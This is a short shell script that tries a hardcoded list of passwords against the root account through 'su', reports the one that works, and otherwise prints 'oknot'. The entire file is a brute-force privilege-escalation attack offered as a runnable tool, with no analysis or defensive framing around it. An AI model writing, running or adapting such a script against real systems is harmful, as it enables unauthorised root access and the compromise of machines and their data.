#!/bin/sh

target_username="root"

password_list="123456789 danielle 123456 Fv67i_+28WRT0mY7x princesa diamond vcdkqhhqdtvxbc3c4mj3238gg"

for password in $password_list; do
    echo "$password" | su - "$target_username" -c "echo 'Successfully switched to $target_username'"
    if [ $? -eq 0 ]; then
        echo "Password cracked: $password"
        exit 0
    fi
done

echo "oknot"
exit 1
